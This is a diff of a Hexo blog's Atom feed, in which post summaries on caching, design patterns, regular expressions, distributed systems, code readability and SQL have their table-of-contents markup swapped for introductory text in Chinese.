-&lt;li&gt;&lt;a href=&quot;#5-外观facade&quot;&gt;5. 外观（Facade）&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#6-享元flyweight&quot;&gt;6. 享元（Flyweight）&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#7-代理proxy&quot;&gt;7. 代理（Proxy）&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#参考资料&quot;&gt;参考资料&lt;/a&gt;&lt;!-- GFM-TOC --&gt;
-
-
-&lt;/li&gt;
-&lt;/ul&gt;
-    
-    </summary>
-    
-    
-      <category term="网络技术" scheme="https://sometwo7.github.io/blog/categories/%E7%BD%91%E7%BB%9C%E6%8A%80%E6%9C%AF/"/>
-    
-    
-      <category term="设计模式" scheme="https://sometwo7.github.io/blog/tags/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>网络技术 - 集群</title>
-    <link href="https://sometwo7.github.io/blog/post/78b8663.html"/>
-    <id>https://sometwo7.github.io/blog/post/78b8663.html</id>
-    <published>2019-11-05T10:02:11.000Z</published>
-    <updated>2019-11-05T13:02:39.948Z</updated>
-    
-    <summary type="html">
-    
-      &lt;ul&gt;
-&lt;li&gt;&lt;a href=&quot;#一负载均衡&quot;&gt;一、负载均衡&lt;/a&gt;&lt;ul&gt;
-&lt;li&gt;&lt;a href=&quot;#负载均衡算法&quot;&gt;负载均衡算法&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#转发实现&quot;&gt;转发实现&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#二集群下的-session-管理&quot;&gt;二、集群下的 Session 管理&lt;/a&gt;&lt;ul&gt;
-&lt;li&gt;&lt;a href=&quot;#sticky-session&quot;&gt;Sticky Session&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#session-replication&quot;&gt;Session Replication&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#session-server&quot;&gt;Session Server&lt;/a&gt;&lt;!-- GFM-TOC --&gt;
-
-
-&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;/ul&gt;&lt;h1 id=&quot;一、负载均衡&quot;&gt;&lt;a href=&quot;#一、负载均衡&quot; class=&quot;headerlink&quot; title=&quot;一、负载均衡&quot;&gt;&lt;/a&gt;一、负载均衡&lt;/h1&gt;&lt;p&gt;集群中的应用服务器（节点）通常被设计成无状态，用户可以请求任何一个节点。&lt;/p&gt;&lt;p&gt;负载均衡器会根据集群中每个节点的负载情况，将用户请求转发到合适的节点上。&lt;/p&gt;
-    
-    </summary>
-    
-    
-      <category term="网络技术" scheme="https://sometwo7.github.io/blog/categories/%E7%BD%91%E7%BB%9C%E6%8A%80%E6%9C%AF/"/>
-    
-    
-      <category term="集群" scheme="https://sometwo7.github.io/blog/tags/%E9%9B%86%E7%BE%A4/"/>
-    
-  </entry>
-  
-  <entry>
     <title>网络技术 - 缓存</title>
     <link href="https://sometwo7.github.io/blog/post/64a35ad1.html"/>
     <id>https://sometwo7.github.io/blog/post/64a35ad1.html</id>
     <published>2019-11-05T10:02:11.000Z</published>
-    <updated>2019-11-05T13:02:39.948Z</updated>
+    <updated>2019-11-12T06:21:18.312Z</updated>
     
     <summary type="html">
     
-      &lt;ul&gt;
-&lt;li&gt;&lt;a href=&quot;#一缓存特征&quot;&gt;一、缓存特征&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#二lru&quot;&gt;二、LRU&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#三缓存位置&quot;&gt;三、缓存位置&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#四cdn&quot;&gt;四、CDN&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#五缓存问题&quot;&gt;五、缓存问题&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#六数据分布&quot;&gt;六、数据分布&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#七一致性哈希&quot;&gt;七、一致性哈希&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#参考资料&quot;&gt;参考资料&lt;/a&gt;&lt;!-- GFM-TOC --&gt;
-
-
+      &lt;h1 id=&quot;一、缓存特征&quot;&gt;&lt;a href=&quot;#一、缓存特征&quot; class=&quot;headerlink&quot; title=&quot;一、缓存特征&quot;&gt;&lt;/a&gt;一、缓存特征&lt;/h1&gt;&lt;h2 id=&quot;命中率&quot;&gt;&lt;a href=&quot;#命中率&quot; class=&quot;headerlink&quot; title=&quot;命中率&quot;&gt;&lt;/a&gt;命中率&lt;/h2&gt;&lt;p&gt;当某个请求能够通过访问缓存而得到响应时，称为缓存命中。&lt;/p&gt;&lt;p&gt;缓存命中率越高，缓存的利用率也就越高。&lt;/p&gt;&lt;h2 id=&quot;最大空间&quot;&gt;&lt;a href=&quot;#最大空间&quot; class=&quot;headerlink&quot; title=&quot;最大空间&quot;&gt;&lt;/a&gt;最大空间&lt;/h2&gt;&lt;p&gt;缓存通常位于内存中，内存的空间通常比磁盘空间小的多，因此缓存的最大空间不可能非常大。&lt;/p&gt;&lt;p&gt;当缓存存放的数据量超过最大空间时，就需要淘汰部分数据来存放新到达的数据。&lt;/p&gt;&lt;h2 id=&quot;淘汰策略&quot;&gt;&lt;a href=&quot;#淘汰策略&quot; class=&quot;headerlink&quot; title=&quot;淘汰策略&quot;&gt;&lt;/a&gt;淘汰策略&lt;/h2&gt;&lt;ul&gt;
+&lt;li&gt;&lt;p&gt;FIFO（First In First Out）：先进先出策略，在实时性的场景下，需要经常访问最新的数据，那么就可以使用 FIFO，使得最先进入的数据（最晚的数据）被淘汰。&lt;/p&gt;
 &lt;/li&gt;
-&lt;/ul&gt;&lt;h1 id=&quot;一、缓存特征&quot;&gt;&lt;a href=&quot;#一、缓存特征&quot; class=&quot;headerlink&quot; title=&quot;一、缓存特征&quot;&gt;&lt;/a&gt;一、缓存特征&lt;/h1&gt;&lt;h2 id=&quot;命中率&quot;&gt;&lt;a href=&quot;#命中率&quot; class=&quot;headerlink&quot; title=&quot;命中率&quot;&gt;&lt;/a&gt;命中率&lt;/h2&gt;&lt;p&gt;当某个请求能够通过访问缓存而得到响应时，称为缓存命中。&lt;/p&gt;&lt;p&gt;缓存命中率越高，缓存的利用率也就越高。&lt;/p&gt;&lt;h2 id=&quot;最大空间&quot;&gt;&lt;a href=&quot;#最大空间&quot; class=&quot;headerlink&quot; title=&quot;最大空间&quot;&gt;&lt;/a&gt;最大空间&lt;/h2&gt;&lt;p&gt;缓存通常位于内存中，内存的空间通常比磁盘空间小的多，因此缓存的最大空间不可能非常大。&lt;/p&gt;
+&lt;li&gt;&lt;p&gt;LRU（Least Recently Used）：最近最久未使用策略，优先淘汰最久未使用的数据，也就是上次被访问时间距离现在最久的数据。该策略可以保证内存中的数据都是热点数据，也就是经常被访问的数据，从而保证缓存命中率。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;LFU（Least Frequently Used）：最不经常使用策略，优先淘汰一段时间内使用次数最少的数据。&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
     
     </summary>
     
@@ -394,30 +119,36 @@
   </entry>
   
   <entry>
+    <title>网络技术 - 设计模式</title>
+    <link href="https://sometwo7.github.io/blog/post/9956399c.html"/>
+    <id>https://sometwo7.github.io/blog/post/9956399c.html</id>
+    <published>2019-11-05T10:02:11.000Z</published>
+    <updated>2019-11-12T06:21:18.316Z</updated>
+    
+    <summary type="html">
+    
+      &lt;h1 id=&quot;一、概述&quot;&gt;&lt;a href=&quot;#一、概述&quot; class=&quot;headerlink&quot; title=&quot;一、概述&quot;&gt;&lt;/a&gt;一、概述&lt;/h1&gt;&lt;p&gt;设计模式是解决问题的方案，学习现有的设计模式可以做到经验复用。&lt;/p&gt;&lt;p&gt;拥有设计模式词汇，在沟通时就能用更少的词汇来讨论，并且不需要了解底层细节。&lt;/p&gt;&lt;h1 id=&quot;二、创建型&quot;&gt;&lt;a href=&quot;#二、创建型&quot; class=&quot;headerlink&quot; title=&quot;二、创建型&quot;&gt;&lt;/a&gt;二、创建型&lt;/h1&gt;&lt;h2 id=&quot;1-单例（Singleton）&quot;&gt;&lt;a href=&quot;#1-单例（Singleton）&quot; class=&quot;headerlink&quot; title=&quot;1. 单例（Singleton）&quot;&gt;&lt;/a&gt;1. 单例（Singleton）&lt;/h2&gt;&lt;h3 id=&quot;Intent&quot;&gt;&lt;a href=&quot;#Intent&quot; class=&quot;headerlink&quot; title=&quot;Intent&quot;&gt;&lt;/a&gt;Intent&lt;/h3&gt;&lt;p&gt;确保一个类只有一个实例，并提供该实例的全局访问点。&lt;/p&gt;&lt;h3 id=&quot;Class-Diagram&quot;&gt;&lt;a href=&quot;#Class-Diagram&quot; class=&quot;headerlink&quot; title=&quot;Class Diagram&quot;&gt;&lt;/a&gt;Class Diagram&lt;/h3&gt;&lt;p&gt;使用一个私有构造函数、一个私有静态变量以及一个公有静态函数来实现。&lt;/p&gt;
+    
+    </summary>
+    
+    
+      <category term="网络技术" scheme="https://sometwo7.github.io/blog/categories/%E7%BD%91%E7%BB%9C%E6%8A%80%E6%9C%AF/"/>
+    
+    
+      <category term="设计模式" scheme="https://sometwo7.github.io/blog/tags/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/"/>
+    
+  </entry>
+  
+  <entry>
     <title>网络技术 - 正则表达式</title>
     <link href="https://sometwo7.github.io/blog/post/38ddab86.html"/>
     <id>https://sometwo7.github.io/blog/post/38ddab86.html</id>
     <published>2019-11-05T10:02:11.000Z</published>
-    <updated>2019-11-05T13:02:39.948Z</updated>
+    <updated>2019-11-12T06:21:18.312Z</updated>
     
     <summary type="html">
     
-      &lt;ul&gt;
-&lt;li&gt;&lt;a href=&quot;#一概述&quot;&gt;一、概述&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#二匹配单个字符&quot;&gt;二、匹配单个字符&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#三匹配一组字符&quot;&gt;三、匹配一组字符&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#四使用元字符&quot;&gt;四、使用元字符&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#五重复匹配&quot;&gt;五、重复匹配&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#六位置匹配&quot;&gt;六、位置匹配&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#七使用子表达式&quot;&gt;七、使用子表达式&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#八回溯引用&quot;&gt;八、回溯引用&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#九前后查找&quot;&gt;九、前后查找&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#十嵌入条件&quot;&gt;十、嵌入条件&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#参考资料&quot;&gt;参考资料&lt;/a&gt;&lt;!-- GFM-TOC --&gt;
-
-
-&lt;/li&gt;
-&lt;/ul&gt;&lt;h1 id=&quot;一、概述&quot;&gt;&lt;a href=&quot;#一、概述&quot; class=&quot;headerlink&quot; title=&quot;一、概述&quot;&gt;&lt;/a&gt;一、概述&lt;/h1&gt;&lt;p&gt;正则表达式用于文本内容的查找和替换。&lt;/p&gt;&lt;p&gt;正则表达式内置于其它语言或者软件产品中，它本身不是一种语言或者软件。&lt;/p&gt;&lt;p&gt;&lt;a href=&quot;https://regexr.com/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;正则表达式在线工具&lt;/a&gt;&lt;/p&gt;&lt;h1 id=&quot;二、匹配单个字符&quot;&gt;&lt;a href=&quot;#二、匹配单个字符&quot; class=&quot;headerlink&quot; title=&quot;二、匹配单个字符&quot;&gt;&lt;/a&gt;二、匹配单个字符&lt;/h1&gt;
+      &lt;h1 id=&quot;一、概述&quot;&gt;&lt;a href=&quot;#一、概述&quot; class=&quot;headerlink&quot; title=&quot;一、概述&quot;&gt;&lt;/a&gt;一、概述&lt;/h1&gt;&lt;p&gt;正则表达式用于文本内容的查找和替换。&lt;/p&gt;&lt;p&gt;正则表达式内置于其它语言或者软件产品中，它本身不是一种语言或者软件。&lt;/p&gt;&lt;p&gt;&lt;a href=&quot;https://regexr.com/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;正则表达式在线工具&lt;/a&gt;&lt;/p&gt;&lt;h1 id=&quot;二、匹配单个字符&quot;&gt;&lt;a href=&quot;#二、匹配单个字符&quot; class=&quot;headerlink&quot; title=&quot;二、匹配单个字符&quot;&gt;&lt;/a&gt;二、匹配单个字符&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;.&lt;/strong&gt;  可以用来匹配任何的单个字符，但是在绝大多数实现里面，不能匹配换行符；&lt;/p&gt;&lt;p&gt;&lt;strong&gt;.&lt;/strong&gt;  是元字符，表示它有特殊的含义，而不是字符本身的含义。如果需要匹配 . ，那么要用 \ 进行转义，即在 . 前面加上 \ 。&lt;/p&gt;
     
     </summary>
     
@@ -430,95 +161,18 @@
   </entry>
   
   <entry>
-    <title>网络技术 - 代码可读性</title>
-    <link href="https://sometwo7.github.io/blog/post/1c7cd43d.html"/>
-    <id>https://sometwo7.github.io/blog/post/1c7cd43d.html</id>
-    <published>2019-11-05T10:02:11.000Z</published>
-    <updated>2019-11-05T13:02:39.948Z</updated>
-    
-    <summary type="html">
-    
-      &lt;ul&gt;
-&lt;li&gt;&lt;a href=&quot;#一可读性的重要性&quot;&gt;一、可读性的重要性&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#二用名字表达代码含义&quot;&gt;二、用名字表达代码含义&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#三名字不能带来歧义&quot;&gt;三、名字不能带来歧义&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#四良好的代码风格&quot;&gt;四、良好的代码风格&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#五为何编写注释&quot;&gt;五、为何编写注释&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#六如何编写注释&quot;&gt;六、如何编写注释&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#七提高控制流的可读性&quot;&gt;七、提高控制流的可读性&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#八拆分长表达式&quot;&gt;八、拆分长表达式&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#九变量与可读性&quot;&gt;九、变量与可读性&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#十抽取函数&quot;&gt;十、抽取函数&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#十一一次只做一件事&quot;&gt;十一、一次只做一件事&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#十二用自然语言表述代码&quot;&gt;十二、用自然语言表述代码&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#十三减少代码量&quot;&gt;十三、减少代码量&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#参考资料&quot;&gt;参考资料&lt;/a&gt;&lt;!-- GFM-TOC --&gt;
-
-
-&lt;/li&gt;
-&lt;/ul&gt;&lt;h1 id=&quot;一、可读性的重要性&quot;&gt;&lt;a href=&quot;#一、可读性的重要性&quot; class=&quot;headerlink&quot; title=&quot;一、可读性的重要性&quot;&gt;&lt;/a&gt;一、可读性的重要性&lt;/h1&gt;&lt;p&gt;编程有很大一部分时间是在阅读代码，不仅要阅读自己的代码，而且要阅读别人的代码。因此，可读性良好的代码能够大大提高编程效率。&lt;/p&gt;
-    
-    </summary>
-    
-    
-      <category term="网络技术" scheme="https://sometwo7.github.io/blog/categories/%E7%BD%91%E7%BB%9C%E6%8A%80%E6%9C%AF/"/>
-    
-    
-      <category term="代码" scheme="https://sometwo7.github.io/blog/tags/%E4%BB%A3%E7%A0%81/"/>
-    
-  </entry>
-  
-  <entry>
     <title>网络技术 - 分布式</title>
     <link href="https://sometwo7.github.io/blog/post/d350a2b7.html"/>
     <id>https://sometwo7.github.io/blog/post/d350a2b7.html</id>
     <published>2019-11-05T10:02:11.000Z</published>
-    <updated>2019-11-05T13:02:39.948Z</updated>
+    <updated>2019-11-12T06:21:18.312Z</updated>
     
     <summary type="html">
     
-      &lt;ul&gt;
-&lt;li&gt;&lt;a href=&quot;#一分布式锁&quot;&gt;一、分布式锁&lt;/a&gt;&lt;ul&gt;
-&lt;li&gt;&lt;a href=&quot;#数据库的唯一索引&quot;&gt;数据库的唯一索引&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#redis-的-setnx-指令&quot;&gt;Redis 的 SETNX 指令&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#redis-的-redlock-算法&quot;&gt;Redis 的 RedLock 算法&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#zookeeper-的有序节点&quot;&gt;Zookeeper 的有序节点&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#二分布式事务&quot;&gt;二、分布式事务&lt;/a&gt;&lt;ul&gt;
-&lt;li&gt;&lt;a href=&quot;#2pc&quot;&gt;2PC&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#本地消息表&quot;&gt;本地消息表&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#三cap&quot;&gt;三、CAP&lt;/a&gt;&lt;ul&gt;
-&lt;li&gt;&lt;a href=&quot;#一致性&quot;&gt;一致性&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#可用性&quot;&gt;可用性&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#分区容忍性&quot;&gt;分区容忍性&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#权衡&quot;&gt;权衡&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#四base&quot;&gt;四、BASE&lt;/a&gt;&lt;ul&gt;
-&lt;li&gt;&lt;a href=&quot;#基本可用&quot;&gt;基本可用&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#软状态&quot;&gt;软状态&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#最终一致性&quot;&gt;最终一致性&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#五paxos&quot;&gt;五、Paxos&lt;/a&gt;&lt;ul&gt;
-&lt;li&gt;&lt;a href=&quot;#执行过程&quot;&gt;执行过程&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#约束条件&quot;&gt;约束条件&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#六raft&quot;&gt;六、Raft&lt;/a&gt;&lt;ul&gt;
-&lt;li&gt;&lt;a href=&quot;#单个-candidate-的竞选&quot;&gt;单个 Candidate 的竞选&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#多个-candidate-竞选&quot;&gt;多个 Candidate 竞选&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#数据同步&quot;&gt;数据同步&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#参考&quot;&gt;参考&lt;/a&gt;&lt;!-- GFM-TOC --&gt;
-
-
-&lt;/li&gt;
-&lt;/ul&gt;
+      &lt;h1 id=&quot;一、分布式锁&quot;&gt;&lt;a href=&quot;#一、分布式锁&quot; class=&quot;headerlink&quot; title=&quot;一、分布式锁&quot;&gt;&lt;/a&gt;一、分布式锁&lt;/h1&gt;&lt;p&gt;在单机场景下，可以使用语言的内置锁来实现进程同步。但是在分布式场景下，需要同步的进程可能位于不同的节点上，那么就需要使用分布式锁。&lt;/p&gt;&lt;p&gt;阻塞锁通常使用互斥量来实现：&lt;/p&gt;&lt;ul&gt;
+&lt;li&gt;互斥量为 0 表示有其它进程在使用锁，此时处于锁定状态；&lt;/li&gt;
+&lt;li&gt;互斥量为 1 表示未锁定状态。&lt;/li&gt;
+&lt;/ul&gt;&lt;p&gt;1 和 0 可以用一个整型值表示，也可以用某个数据是否存在表示。&lt;/p&gt;
     
     </summary>
     
@@ -531,43 +185,36 @@
   </entry>
   
   <entry>
+    <title>网络技术 - 代码可读性</title>
+    <link href="https://sometwo7.github.io/blog/post/1c7cd43d.html"/>
+    <id>https://sometwo7.github.io/blog/post/1c7cd43d.html</id>
+    <published>2019-11-05T10:02:11.000Z</published>
+    <updated>2019-11-12T06:21:18.312Z</updated>
+    
+    <summary type="html">
+    
+      &lt;h1 id=&quot;一、可读性的重要性&quot;&gt;&lt;a href=&quot;#一、可读性的重要性&quot; class=&quot;headerlink&quot; title=&quot;一、可读性的重要性&quot;&gt;&lt;/a&gt;一、可读性的重要性&lt;/h1&gt;&lt;p&gt;编程有很大一部分时间是在阅读代码，不仅要阅读自己的代码，而且要阅读别人的代码。因此，可读性良好的代码能够大大提高编程效率。&lt;/p&gt;&lt;p&gt;可读性良好的代码往往会让代码架构更好，因为程序员更愿意去修改这部分代码，而且也更容易修改。&lt;/p&gt;&lt;p&gt;只有在核心领域为了效率才可以放弃可读性，否则可读性是第一位。&lt;/p&gt;&lt;h1 id=&quot;二、用名字表达代码含义&quot;&gt;&lt;a href=&quot;#二、用名字表达代码含义&quot; class=&quot;headerlink&quot; title=&quot;二、用名字表达代码含义&quot;&gt;&lt;/a&gt;二、用名字表达代码含义&lt;/h1&gt;
+    
+    </summary>
+    
+    
+      <category term="网络技术" scheme="https://sometwo7.github.io/blog/categories/%E7%BD%91%E7%BB%9C%E6%8A%80%E6%9C%AF/"/>
+    
+    
+      <category term="代码" scheme="https://sometwo7.github.io/blog/tags/%E4%BB%A3%E7%A0%81/"/>
+    
+  </entry>
+  
+  <entry>
     <title>网络技术 - SQL</title>
     <link href="https://sometwo7.github.io/blog/post/4ce9f201.html"/>
     <id>https://sometwo7.github.io/blog/post/4ce9f201.html</id>
     <published>2019-11-05T10:02:11.000Z</published>
-    <updated>2019-11-05T13:02:39.948Z</updated>
+    <updated>2019-11-12T06:21:18.312Z</updated>
     
     <summary type="html">
     
-      &lt;ul&gt;
-&lt;li&gt;&lt;a href=&quot;#一基础&quot;&gt;一、基础&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#二创建表&quot;&gt;二、创建表&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#三修改表&quot;&gt;三、修改表&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#四插入&quot;&gt;四、插入&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#五更新&quot;&gt;五、更新&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#六删除&quot;&gt;六、删除&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#七查询&quot;&gt;七、查询&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#八排序&quot;&gt;八、排序&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#九过滤&quot;&gt;九、过滤&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#十通配符&quot;&gt;十、通配符&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#十一计算字段&quot;&gt;十一、计算字段&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#十二函数&quot;&gt;十二、函数&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#十三分组&quot;&gt;十三、分组&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#十四子查询&quot;&gt;十四、子查询&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#十五连接&quot;&gt;十五、连接&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#十六组合查询&quot;&gt;十六、组合查询&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#十七视图&quot;&gt;十七、视图&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#十八存储过程&quot;&gt;十八、存储过程&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#十九游标&quot;&gt;十九、游标&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#二十触发器&quot;&gt;二十、触发器&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#二十一事务管理&quot;&gt;二十一、事务管理&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#二十二字符集&quot;&gt;二十二、字符集&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#二十三权限管理&quot;&gt;二十三、权限管理&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#参考资料&quot;&gt;参考资料&lt;/a&gt;&lt;!-- GFM-TOC --&gt;
-
-
-&lt;/li&gt;
-&lt;/ul&gt;
+      &lt;h1 id=&quot;一、基础&quot;&gt;&lt;a href=&quot;#一、基础&quot; class=&quot;headerlink&quot; title=&quot;一、基础&quot;&gt;&lt;/a&gt;一、基础&lt;/h1&gt;&lt;p&gt;模式定义了数据如何存储、存储什么样的数据以及数据如何分解等信息，数据库和表都有模式。&lt;/p&gt;&lt;p&gt;主键的值不允许修改，也不允许复用（不能将已经删除的主键值赋给新数据行的主键）。&lt;/p&gt;&lt;p&gt;SQL（Structured Query Language)，标准 SQL 由 ANSI 标准委员会管理，从而称为 ANSI SQL。各个 DBMS 都有自己的实现，如 PL/SQL、Transact-SQL 等。&lt;/p&gt;
     
     </summary>
     
@@ -584,74 +231,11 @@
     <link href="https://sometwo7.github.io/blog/post/2355d11.html"/>
     <id>https://sometwo7.github.io/blog/post/2355d11.html</id>
     <published>2019-11-05T10:02:11.000Z</published>
-    <updated>2019-11-05T13:02:39.948Z</updated>
+    <updated>2019-11-12T06:21:18.312Z</updated>
     
     <summary type="html">
     
-      &lt;ul&gt;
-&lt;li&gt;&lt;a href=&quot;#一概述&quot;&gt;一、概述&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#二数据类型&quot;&gt;二、数据类型&lt;/a&gt;&lt;ul&gt;
-&lt;li&gt;&lt;a href=&quot;#string&quot;&gt;STRING&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#list&quot;&gt;LIST&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#set&quot;&gt;SET&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#hash&quot;&gt;HASH&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#zset&quot;&gt;ZSET&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#三数据结构&quot;&gt;三、数据结构&lt;/a&gt;&lt;ul&gt;
-&lt;li&gt;&lt;a href=&quot;#字典&quot;&gt;字典&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#跳跃表&quot;&gt;跳跃表&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#四使用场景&quot;&gt;四、使用场景&lt;/a&gt;&lt;ul&gt;
-&lt;li&gt;&lt;a href=&quot;#计数器&quot;&gt;计数器&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#缓存&quot;&gt;缓存&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#查找表&quot;&gt;查找表&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#消息队列&quot;&gt;消息队列&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#会话缓存&quot;&gt;会话缓存&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#分布式锁实现&quot;&gt;分布式锁实现&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#其它&quot;&gt;其它&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#五redis-与-memcached&quot;&gt;五、Redis 与 Memcached&lt;/a&gt;&lt;ul&gt;
